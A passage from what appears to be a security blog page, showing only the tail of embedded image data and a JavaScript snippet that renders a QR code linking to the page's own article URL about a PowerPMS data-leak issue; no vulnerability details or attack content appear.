n63uq/vO0SPXJ9pvrt++XN8Z6hHNrlDfCr2H+SuffnHlV9cXvD8hnso3we2/IW7/VfT5s9WU3LxcjGdfK5/63ru/dp6oP6i2QufYlyebUhftyxtX/cxKtV+eXqp5tPsT4ql8E9wW4ravsJ87W02pm4+Wah4tpd651u2vUH/wymM/3tSKq/8pZnZqlU8vZT/X1rYQmze+9wQeFpK396xWj+lmu6/uLLnY/hU3L+qTn6Ee79Ue++ryRvviqq+ur9H+1fPE97CQiHe97wT++UJWb4dfYvebt0++Qt+6YHuc3XpzfZmR6n60VOsrHu9ZeR9zetSD/3wh3uzGPzuBf74Qt97Yj2dfvXnr9kX7e7TXuPc8u84bmtLjnGgpuX2x9XhT9hv1x5Pa9//5QvbD7+vPn8DDQtxe49Vo/fqy+dQVX+XUMyPlnGcY31k5S3w2Iz19zmoezytlXnSO2ebRHxYS8a73ncC2ELd4hX/6qGdvQ2Z5v1yn9KnL09vXSo/HnugsMZ6U/Vyn5PpWXD2ZlP5cp7ofLdW+aF3bQrpx8/ecwL2Q95z78q7/BwAA////i7rFAAAABklEQVQDAL6+ELOcpXG6AAAAAElFTkSuQmCC)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/powerpms-Transfer-LoadDataSource-data-leak.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 